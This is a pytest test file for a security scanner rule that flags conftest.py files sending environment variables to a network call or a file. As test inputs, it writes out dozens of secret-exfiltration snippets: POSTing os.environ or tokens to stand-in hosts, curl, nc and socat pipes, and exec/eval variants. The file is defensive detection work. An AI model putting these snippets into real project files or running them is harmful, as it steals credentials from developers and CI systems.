"""AAK-STARTUP-HOOK-CONFTEST-001: a conftest.py that sends the environment away.

pytest imports every conftest.py under its rootdir and the test paths before the
first test, with the environment of the shell that started it. On 0.6.36 a
conftest.py that posted `dict(os.environ)` to an address, or wrote the names of
every `*_KEY` and `*_TOKEN` variable to a file, passed every rule. These tests
pin each fixture's count and severity, where the finding sits and what its
evidence names, every source and sink form the rule text lists, and each
limitation sentence. No test runs pytest on a fixture, imports one or touches
the network: the scanner parses the files, and the tests only scan them. The
addresses are TEST-NET (192.0.2.0/24, 198.51.100.0/24) and example.invalid.
"""

from __future__ import annotations

import ast
import json
import textwrap
import time
from pathlib import Path

import pytest

from agent_audit_kit.engine import run_scan
from agent_audit_kit.models import Category, ScanResult, Severity
from agent_audit_kit.output.sarif import format_results
from agent_audit_kit.rules.builtin import RULES
from agent_audit_kit.scanners import startup_hooks
from agent_audit_kit.scanners._helpers import CONFIG_MAX_BYTES, collecting_refusals
from agent_audit_kit.scanners.startup_hooks import scan

REPO = Path(__file__).resolve().parent.parent
FIXTURES = REPO / "tests" / "fixtures" / "startup_hooks_conftest"
RULE = "AAK-STARTUP-HOOK-CONFTEST-001"
HIGH, MEDIUM = Severity.HIGH, Severity.MEDIUM

# case -> (findings, severity, the line the finding sits on)
CASES: dict[str, tuple[int, Severity | None, int | None]] = {
    "env-dump-network": (1, HIGH, 6),
    "key-names-to-file": (1, MEDIUM, 3),
    "named-key-network": (1, HIGH, 6),
    "curl-subprocess": (1, HIGH, 6),
    "from-import": (1, MEDIUM, 4),
    "fixture-reads-one-env": (0, None, None),
    "delenv-loop": (0, None, None),
    "child-env": (0, None, None),
    "syntax-error": (0, None, None),
    "node-modules": (0, None, None),
}


def _mine(root: Path) -> list:
    findings, _files = scan(root)
    return [f for f in findings if f.rule_id == RULE]


def _conftest(tmp_path: Path, body: str, rel: str = "tests/conftest.py") -> Path:
    path = tmp_path / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(textwrap.dedent(body), encoding="utf-8")
    return path


def _reported(tmp_path: Path, body: str) -> list:
    _conftest(tmp_path, body)
    return _mine(tmp_path)


# ---- the fixtures -------------------------------------------------------------------


@pytest.mark.parametrize("case", sorted(CASES))
def test_each_fixture_gives_its_count_and_severity_on_the_sinks_line(case: str) -> None:
    count, severity, line = CASES[case]
    found = _mine(FIXTURES / case)
    assert len(found) == count, [f.evidence for f in found]
    if count:
        assert found[0].severity is severity
        assert found[0].line_number == line
        assert found[0].file_path == "tests/conftest.py"


def test_the_fixtures_cover_both_hand_overs() -> None:
    assert {p.name for p in FIXTURES.iterdir() if p.is_dir()} == set(CASES)


def test_the_sink_line_is_the_calls_line_not_the_reads(tmp_path: Path) -> None:
    found = _reported(tmp_path, """\
        import json, os, urllib.request
        payload = json.dumps(dict(os.environ)).encode()


        urllib.request.urlopen("http://192.0.2.10:8080/c", data=payload)
    """)
    assert [f.line_number for f in found] == [5]
    assert "read whole on line 2, through `payload`, to a network call" in found[0].evidence


def test_the_evidence_names_both_lines_the_sink_and_the_pytest_import() -> None:
    evidence = _mine(FIXTURES / "env-dump-network")[0].evidence
    assert evidence.startswith("Line 6 sends the environment, read whole on line 6, to a network call")
    assert "(`urllib.request.urlopen`)" in evidence
    assert 'urllib.request.urlopen("http://192.0.2.10:8080/c"' in evidence
    assert "pytest imports every conftest.py" in evidence
    assert "before the first test" in evidence


def test_the_evidence_names_a_variable_read_by_its_literal_name() -> None:
    evidence = _mine(FIXTURES / "named-key-network")[0].evidence
    assert evidence.startswith("Line 6 sends `OPENAI_API_KEY`, read on line 6, to a network call (`requests.post`)")


def test_the_three_line_conftest_is_reported_through_its_name() -> None:
    evidence = _mine(FIXTURES / "key-names-to-file")[0].evidence
    assert "Line 3 writes the environment, read whole on line 2, through `keys`, to a file (`.write_text`)" in evidence


def test_the_evidence_lists_every_literal_name_it_reads(tmp_path: Path) -> None:
    found = _reported(tmp_path, """\
        import os, requests
        requests.post("https://example.invalid/x", json=[os.getenv("GITHUB_TOKEN"), os.environ["OPENAI_API_KEY"]])
    """)
    assert "sends `GITHUB_TOKEN`, `OPENAI_API_KEY`, read on line 2" in found[0].evidence


def test_sarif_output_carries_the_rule_on_the_sinks_line() -> None:
    result = run_scan(project_root=FIXTURES / "env-dump-network")
    mine = ScanResult(findings=[f for f in result.findings if f.rule_id == RULE])
    sarif = json.loads(format_results(mine, min_severity=Severity.LOW))
    results = sarif["runs"][0]["results"]
    assert [r["ruleId"] for r in results] == [RULE]
    assert results[0]["locations"][0]["physicalLocation"]["region"]["startLine"] == 6
    assert results[0]["level"] == "error"
    assert {r["id"] for r in sarif["runs"][0]["tool"]["driver"]["rules"]} == {RULE}


def test_the_rule_is_registered_as_its_text_says() -> None:
    rule = RULES[RULE]
    assert rule.severity is HIGH and rule.category is Category.SUPPLY_CHAIN
    assert rule.title == "conftest.py sends the environment to a network call or a file"
    assert rule.sarif_name == "PytestConftestSendsEnvironment"
    assert rule.incident_references == ["ARXIV-2611.19764"]
    assert rule.aicm_references == ["STA-08"]
    assert rule.owasp_mcp_references == []
    assert "arXiv:2611.19764" in rule.description and "72.9% to 84.5%" in rule.description


def test_aaks_own_conftest_and_the_copy_of_its_loop_are_quiet(tmp_path: Path) -> None:
    own = (REPO / "tests" / "conftest.py").read_text(encoding="utf-8")
    loop = 'for key in [k for k in os.environ if k.lower() == "npm_config_cache"]:'
    assert loop in own
    assert loop in (FIXTURES / "delenv-loop" / "tests" / "conftest.py").read_text(encoding="utf-8")
    _conftest(tmp_path, own)
    assert _mine(tmp_path) == []


def test_pytest_does_not_collect_the_fixture_trees() -> None:
    """The fixtures are conftest.py files pytest would import, and run, if it
    collected tests/fixtures; tests/conftest.py keeps it out."""
    tree = ast.parse((REPO / "tests" / "conftest.py").read_text(encoding="utf-8"))
    ignored = [
        ast.literal_eval(node.value) for node in tree.body
        if isinstance(node, ast.Assign) and any(getattr(t, "id", "") == "collect_ignore" for t in node.targets)
    ]
    assert ignored == [["fixtures"]]


def test_the_scan_lists_the_conftest_files_it_read() -> None:
    _findings, files = scan(FIXTURES / "syntax-error")
    assert files == {"tests/conftest.py"}
    _findings, files = scan(FIXTURES / "node-modules")
    assert files == set()


# ---- every source form ---------------------------------------------------------------

_SOURCES = {
    "for loop": "for k in os.environ:\n    requests.post(URL, data=k)",
    "comprehension": "requests.post(URL, data=[k for k in os.environ])",
    "sorted": "requests.post(URL, data=sorted(os.environ))",
    "list": "requests.post(URL, data=list(os.environ))",
    "items": "requests.post(URL, data=str(os.environ.items()))",
    "keys": "requests.post(URL, data=str(os.environ.keys()))",
    "values": "requests.post(URL, data=str(os.environ.values()))",
    "copy": "requests.post(URL, json=os.environ.copy())",
    "dict": "requests.post(URL, json=dict(os.environ))",
    "dict unpacking": "requests.post(URL, json={**os.environ})",
    "passed whole": "requests.post(URL, json=os.environ)",
    "starred": "requests.post(URL, json=[*os.environ])",
    "f-string": 'requests.post(URL, data=f"{os.environ}")',
    "subscript _KEY": 'requests.post(URL, data=os.environ["A_KEY"])',
    "get _TOKEN": 'requests.post(URL, data=os.environ.get("GITHUB_TOKEN"))',
    "getenv _SECRET": 'requests.post(URL, data=os.getenv("CLIENT_SECRET"))',
    "_PASSWORD": 'requests.post(URL, data=os.getenv("DB_PASSWORD", ""))',
    "AWS secret": 'requests.post(URL, data=os.environ["AWS_SECRET_ACCESS_KEY"])',
    "loop over items": "for k, v in os.environ.items():\n    requests.post(URL, data=v)",
    "comprehension variable": "[requests.post(URL, data=v) for k, v in os.environ.items()]",
    "walrus": "requests.post(URL, data=(d := dict(os.environ)))\nrequests.get(URL, params=d)",
    "augmented": "d = ''\nd += str(dict(os.environ))\nrequests.post(URL, data=d)",
    "annotated": "d: dict = dict(os.environ)\nrequests.post(URL, json=d)",
    "bound in a function, read in another": (
        "def a():\n    d = dict(os.environ)\n\ndef b():\n    requests.post(URL, json=d)"
    ),
}


@pytest.mark.parametrize("name", sorted(_SOURCES))
def test_every_source_form_is_read(tmp_path: Path, name: str) -> None:
    body = "import os\nimport requests\nURL = 'https://example.invalid/x'\n" + _SOURCES[name] + "\n"
    found = _reported(tmp_path, body)
    assert len(found) == 1 and found[0].severity is HIGH, name


@pytest.mark.parametrize("head, read", [
    ("from os import environ", "dict(environ)"),
    ("from os import environ as e", "dict(e)"),
    ("import os as o", "dict(o.environ)"),
    ("from os import getenv", 'getenv("A_TOKEN")'),
    ("import os.path", "dict(os.environ)"),
])
def test_every_import_spelling_is_resolved(tmp_path: Path, head: str, read: str) -> None:
    found = _reported(tmp_path, f"{head}\nimport requests\nrequests.post('https://example.invalid/x', json={read})\n")
    assert len(found) == 1, (head, read)


# ---- every sink form -----------------------------------------------------------------

_NETWORK_SINKS = {
    "urlopen": "import urllib.request\nurllib.request.urlopen('http://192.0.2.10/', data=D)",
    "Request": "from urllib.request import Request\nRequest('http://192.0.2.10/', data=D)",
    "urllib alias": "import urllib.request as ur\nur.urlopen('http://192.0.2.10/', data=D)",
    "http.client": "import http.client\nc = http.client.HTTPSConnection('192.0.2.10')\nc.request('POST', '/', D)",
    "http.client inline": "import http.client\nhttp.client.HTTPConnection('192.0.2.10').request('POST', '/', D)",
    "socket": "import socket\ns = socket.socket()\ns.connect(('192.0.2.10', 80))\ns.sendall(D)",
    "create_connection": "import socket\nsocket.create_connection(('192.0.2.10', 80)).sendall(D)",
    "requests.put": "import requests\nrequests.put('https://example.invalid/x', data=D)",
    "requests session": "import requests\ns = requests.Session()\ns.post('https://example.invalid/x', data=D)",
    "httpx": "import httpx\nhttpx.post('https://example.invalid/x', content=D)",
    "httpx client": "import httpx\nwith httpx.Client() as c:\n    c.post('https://example.invalid/x', content=D)",
    "aiohttp session": (
        "import aiohttp\nasync def f():\n    async with aiohttp.ClientSession() as s:\n"
        "        await s.post('https://example.invalid/x', data=D)"
    ),
    "aiohttp session made with headers": "import aiohttp\naiohttp.ClientSession(headers=dict(os.environ))",
    "aiohttp.request": "import aiohttp\naiohttp.request('POST', 'https://example.invalid/x', data=D)",
    "subprocess curl": "import subprocess\nsubprocess.run(['curl', '-d', D, 'http://192.0.2.10/'])",
    "subprocess path to curl": "import subprocess\nsubprocess.call(['/usr/bin/curl', '-d', D, 'http://192.0.2.10/'])",
    "subprocess args keyword": "import subprocess\nsubprocess.Popen(args=['wget', '--post-data', D, 'http://192.0.2.10/'])",
    "subprocess input": "import subprocess\nsubprocess.run(['nc', '192.0.2.10', '80'], input=D)",
    "sh -c": "import subprocess\nsubprocess.check_call(['sh', '-c', f'curl -d {D} http://192.0.2.10/'])",
    "shell string": "import subprocess\nsubprocess.run('socat - TCP:192.0.2.10:80 <<< ' + D, shell=True)",
    "os.system": "os.system('ncat 192.0.2.10 80 < ' + D)",
    "os.popen": "os.popen(f'echo {D} | nc 192.0.2.10 80')",
    "check_output": "import subprocess\nsubprocess.check_output(['curl', '--data', D, 'http://192.0.2.10/'])",
}
_FILE_SINKS = {
    "open w": "open('e.txt', 'w').write(D)",
    "open a": "open('e.txt', 'a').write(D)",
    "open x": "open('e.txt', mode='x').writelines([D])",
    "open r+": "open('e.txt', 'r+').write(D)",
    "with open": "with open('e.txt', 'w') as fh:\n    fh.write(D)",
    "handle bound first": "fh = open('e.txt', 'w')\nfh.write(D)",
    "io.open": "import io\nio.open('e.txt', 'w').write(D)",
    "write_text": "import pathlib\npathlib.Path('e.txt').write_text(D)",
    "write_bytes": "import pathlib\npathlib.Path('e.txt').write_bytes(D.encode())",
    "path open": "import pathlib\nwith pathlib.Path('e.txt').open('w') as fh:\n    fh.write(D)",
    "print to a file": "with open('e.txt', 'w') as fh:\n    print(D, file=fh)",
    "json.dump": "import json\nwith open('e.json', 'w') as fh:\n    json.dump(D, fh)",
}


@pytest.mark.parametrize("name", sorted(_NETWORK_SINKS))
def test_every_network_sink_is_high(tmp_path: Path, name: str) -> None:
    found = _reported(tmp_path, "import os\nD = str(dict(os.environ))\n" + _NETWORK_SINKS[name] + "\n")
    assert [f.severity for f in found] == [HIGH], name


@pytest.mark.parametrize("name", sorted(_FILE_SINKS))
def test_every_file_write_is_medium(tmp_path: Path, name: str) -> None:
    found = _reported(tmp_path, "import os\nD = str(dict(os.environ))\n" + _FILE_SINKS[name] + "\n")
    assert [f.severity for f in found] == [MEDIUM], name


@pytest.mark.parametrize("body", [
    "open('e.txt').write(D)",
    "open('e.txt', 'rb').read()",
    "os.open('x.txt', os.O_WRONLY)",
    "import subprocess\nsubprocess.run(['git', 'push', D])",
    "import subprocess\nsubprocess.run(['git', 'clone', 'https://example.invalid/nc', D])",
    "import subprocess\nsubprocess.run(['echo', D])",
], ids=["open for reading", "read mode", "os.open", "git", "a url ending in a tool name", "echo"])
def test_a_call_that_neither_sends_nor_writes_is_quiet(tmp_path: Path, body: str) -> None:
    assert _reported(tmp_path, "import os\nD = str(dict(os.environ))\n" + body + "\n") == []


def test_one_finding_per_file_on_the_first_network_sink(tmp_path: Path) -> None:
    found = _reported(tmp_path, """\
        import os, requests
        D = dict(os.environ)
        open("e.txt", "w").write(str(D))
        requests.post("https://example.invalid/b", json=D)
        requests.post("https://example.invalid/a", json=D)
    """)
    assert [(f.severity, f.line_number) for f in found] == [(HIGH, 4)]


def test_with_no_network_sink_the_first_file_write_is_reported(tmp_path: Path) -> None:
    found = _reported(tmp_path, """\
        import os, pathlib
        D = str(dict(os.environ))
        pathlib.Path("b.txt").write_text(D)
        pathlib.Path("a.txt").write_text(D)
    """)
    assert [(f.severity, f.line_number) for f in found] == [(MEDIUM, 3)]


def test_every_conftest_in_the_tree_is_read(tmp_path: Path) -> None:
    body = "import os, requests\nrequests.post('https://example.invalid/x', json=dict(os.environ))\n"
    for rel in ("conftest.py", "tests/conftest.py", "src/pkg/tests/unit/conftest.py"):
        _conftest(tmp_path, body, rel)
    assert sorted(f.file_path for f in _mine(tmp_path)) == [
        "conftest.py", "src/pkg/tests/unit/conftest.py", "tests/conftest.py",
    ]


def test_scanning_never_imports_or_runs_the_file(tmp_path: Path) -> None:
    marker = tmp_path / "ran"
    _conftest(tmp_path, f"""\
        import os, pathlib, requests
        pathlib.Path({str(marker)!r}).write_text("ran")
        requests.post("https://example.invalid/x", json=dict(os.environ))
        raise SystemExit(3)
    """)
    found = _mine(tmp_path)
    assert len(found) == 1
    assert not marker.exists()


# ---- the limitations, one test per sentence -------------------------------------------


@pytest.mark.parametrize("rel", ["tests/plugins/env_plugin.py", "noxfile.py", "tests/conftest_helpers.py"])
def test_only_files_named_conftest_py_are_read(tmp_path: Path, rel: str) -> None:
    _conftest(tmp_path, "pytest_plugins = ['tests.plugins.env_plugin']\n")
    _conftest(tmp_path, "import os, requests\nrequests.post('https://example.invalid/x', json=dict(os.environ))\n", rel)
    assert _mine(tmp_path) == []


@pytest.mark.parametrize("skipped", ["node_modules/pkg", ".venv/lib", "vendor/x", ".claude/worktrees/w/tests"])
def test_skip_directories_and_worktrees_are_not_walked(tmp_path: Path, skipped: str) -> None:
    body = "import os, requests\nrequests.post('https://example.invalid/x', json=dict(os.environ))\n"
    _conftest(tmp_path, body, f"{skipped}/conftest.py")
    assert _mine(tmp_path) == []


def test_tox_ini_and_package_json_test_scripts_are_not_read(tmp_path: Path) -> None:
    (tmp_path / "tox.ini").write_text("[testenv]\ncommands = sh -c 'env | curl -d @- http://192.0.2.10/'\n")
    (tmp_path / "package.json").write_text(json.dumps({"scripts": {"test": "env | curl -d @- http://192.0.2.10/"}}))
    assert _mine(tmp_path) == []


def test_a_file_without_environ_or_getenv_is_not_parsed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    parsed: list[object] = []
    real = startup_hooks.parse_python
    monkeypatch.setattr(startup_hooks, "parse_python", lambda source, path: parsed.append(path) or real(source, path))
    _conftest(tmp_path, "import requests\nrequests.post('https://example.invalid/x', data=open('/etc/hosts').read())\n")
    assert _mine(tmp_path) == [] and parsed == []
    _conftest(tmp_path, "import os, requests\nrequests.post('https://example.invalid/x', json=dict(os.environ))\n")
    assert len(_mine(tmp_path)) == 1 and len(parsed) == 1


def test_a_file_that_does_not_parse_is_not_reported_and_does_not_raise(tmp_path: Path) -> None:
    for broken in (b"def f(:\n    import os\n", b"import os\x00\nos.environ\n", b"\xff\xfe" + b"environ(" * 3):
        (tmp_path / "conftest.py").write_bytes(broken)
        assert _mine(tmp_path) == []


def test_a_bom_and_a_coding_line_are_read_as_python_reads_them(tmp_path: Path) -> None:
    body = b"import os, requests\nrequests.post('https://example.invalid/x', json=dict(os.environ))\n"
    (tmp_path / "conftest.py").write_bytes(b"\xef\xbb\xbf" + body)
    assert len(_mine(tmp_path)) == 1
    (tmp_path / "conftest.py").write_bytes(b"# -*- coding: latin-1 -*-\n# caf\xe9\n" + body)
    assert [f.line_number for f in _mine(tmp_path)] == [4]


@pytest.mark.parametrize("read", [
    'os.environ["DATABASE_URL"]',
    'os.environ.get("HOME")',
    'os.getenv("CI")',
    'os.environ[f"{PREFIX}_KEY"]',
    'os.environ.get(PREFIX + "_TOKEN")',
    'os.environ.get(NAME)',
])
def test_a_variable_named_otherwise_or_built_at_run_time_is_not_a_source(tmp_path: Path, read: str) -> None:
    body = f"import os, requests\nPREFIX = NAME = 'A'\nrequests.post('https://example.invalid/x', data={read})\n"
    assert _reported(tmp_path, body) == []


@pytest.mark.parametrize("body", [
    # two hops: a name bound from a name bound from the source
    "D = dict(os.environ)\nE = D\nrequests.post(URL, json=E)",
    # an attribute
    "class C:\n    pass\nC.env = dict(os.environ)\nrequests.post(URL, json=C.env)",
    # a function's return value
    "def env():\n    return dict(os.environ)\nrequests.post(URL, json=env())",
    # a comprehension's variable read outside it
    "[k for k in os.environ]\nrequests.post(URL, data=k)",
], ids=["two hops", "attribute", "return value", "comprehension variable outside it"])
def test_the_flow_is_one_hop_inside_one_file(tmp_path: Path, body: str) -> None:
    head = "import os, requests\nURL = 'https://example.invalid/x'\n"
    assert _reported(tmp_path, head + body + "\n") == []


def test_a_flow_through_another_file_is_not_followed(tmp_path: Path) -> None:
    (tmp_path / "tests").mkdir()
    (tmp_path / "tests" / "envdump.py").write_text("import os\nD = dict(os.environ)\n")
    found = _reported(tmp_path, "import requests\nfrom envdump import D\nrequests.post('https://example.invalid/x', json=D)\n")
    assert found == []


def test_a_bound_name_counts_wherever_it_is_read(tmp_path: Path) -> None:
    found = _reported(tmp_path, """\
        import os, requests


        def setup():
            payload = dict(os.environ)


        def other(payload):
            requests.post("https://example.invalid/x", json=payload)
    """)
    assert [f.line_number for f in found] == [9]


@pytest.mark.parametrize("body", [
    "subprocess.run(['curl', 'http://192.0.2.10/'], env={**os.environ, 'X': '1'})",
    "subprocess.run(['curl', 'http://192.0.2.10/'], env=os.environ)",
    "CMD = ['curl', '-d', str(dict(os.environ)), 'http://192.0.2.10/']\nsubprocess.run(CMD)",
    "subprocess.run('curl -d $DEPLOY_KEY http://192.0.2.10/', shell=True)",
    "os.system('env | curl -d @- http://192.0.2.10/')",
], ids=["env= unpacked", "env= whole", "command in a variable", "shell expands a variable", "env piped to curl"])
def test_a_subprocess_flow_is_read_only_through_its_command_and_input(tmp_path: Path, body: str) -> None:
    assert _reported(tmp_path, "import os, subprocess\n" + body + "\n") == []


@pytest.mark.parametrize("body", [
    "print(dict(os.environ))",
    "import sys\nsys.stdout.write(str(dict(os.environ)))",
    "import logging\nlogging.warning('%s', dict(os.environ))",
])
def test_printing_or_logging_the_environment_is_not_reported(tmp_path: Path, body: str) -> None:
    assert _reported(tmp_path, "import os\n" + body + "\n") == []


@pytest.mark.parametrize("body", [
    "requests.post(URL, json=dict(__import__('os').environ))",
    "import importlib\nrequests.post(URL, json=dict(importlib.import_module('os').environ))",
    "import os\nrequests.post(URL, json=dict(getattr(os, 'environ')))",
    "exec(\"import os, requests; requests.post('https://example.invalid/x', json=dict(os.environ))\")",
    "eval(\"requests.post('https://example.invalid/x', json=dict(__import__('os').environ))\")",
], ids=["__import__", "importlib", "getattr", "exec", "eval"])
def test_dynamic_imports_getattr_and_exec_of_a_string_are_not_followed(tmp_path: Path, body: str) -> None:
    assert _reported(tmp_path, "import requests\nURL = 'https://example.invalid/x'\n" + body + "\n") == []


def test_where_a_request_goes_is_not_judged(tmp_path: Path) -> None:
    """A fixture authenticating to the service it tests is reported like a leak."""
    found = _reported(tmp_path, """\
        import os, pytest, requests


        @pytest.fixture
        def client():
            return requests.get("https://example.invalid/health",
                                headers={"Authorization": os.environ["SERVICE_TOKEN"]})
    """)
    assert [(f.severity, f.line_number) for f in found] == [(HIGH, 6)]


def test_a_conftest_over_the_cap_is_refused_and_one_at_it_is_read(tmp_path: Path) -> None:
    head = b"import os, requests\nrequests.post('https://example.invalid/x', json=dict(os.environ))\n"
    (tmp_path / "conftest.py").write_bytes(head + b"#" * (CONFIG_MAX_BYTES - len(head) + 1))
    with collecting_refusals() as refused:
        assert _mine(tmp_path) == []
    assert list(refused) == [str(tmp_path / "conftest.py")]
    assert "larger than 1,000,000 bytes" in refused[str(tmp_path / "conftest.py")]
    (tmp_path / "conftest.py").write_bytes(head + b"#" * (CONFIG_MAX_BYTES - len(head)))
    with collecting_refusals() as refused:
        assert len(_mine(tmp_path)) == 1
    assert refused == {}


def test_an_oversized_conftest_marks_the_scan_incomplete(tmp_path: Path) -> None:
    (tmp_path / "conftest.py").write_bytes(b"import os\n" + b"#" * CONFIG_MAX_BYTES)
    result = run_scan(project_root=tmp_path)
    assert {f.file_path for f in result.scanner_failures} == {"conftest.py"}
    assert any("conftest.py larger than 1,000,000 bytes" in f.evidence for f in result.scanner_failures)


# ---- bounded time ----------------------------------------------------------------------


def _cpu(run: object) -> float:
    started = time.process_time()
    run()  # type: ignore[operator]
    return time.process_time() - started


def test_a_1mb_conftest_full_of_reads_names_and_sinks_scans_in_bounded_time(tmp_path: Path) -> None:
    unit = "v{i} = os.environ['K{i}_KEY']\nrequests.post(URL, data=v{i})\nopen('f', 'w').write(v{i})\n"
    head = "import os, requests\nURL = 'https://example.invalid/x'\n"
    body, i = [head], 0
    size = len(head)
    while True:
        piece = unit.format(i=i)
        if size + len(piece) >= CONFIG_MAX_BYTES:
            break
        body.append(piece)
        size += len(piece)
        i += 1
    (tmp_path / "conftest.py").write_text("".join(body), encoding="utf-8")
    assert CONFIG_MAX_BYTES - 200 < (tmp_path / "conftest.py").stat().st_size <= CONFIG_MAX_BYTES
    found: list = []
    seconds = _cpu(lambda: found.extend(_mine(tmp_path)))
    assert [(f.severity, f.line_number) for f in found] == [(HIGH, 4)]
    assert seconds < 10.0, seconds


def test_a_1mb_conftest_without_environ_is_skipped_unparsed_in_bounded_time(tmp_path: Path) -> None:
    line = "requests.post(URL, data=open('/etc/hosts').read())\n"
    (tmp_path / "conftest.py").write_text(line * (CONFIG_MAX_BYTES // len(line)), encoding="utf-8")
    assert _cpu(lambda: _mine(tmp_path)) < 1.0
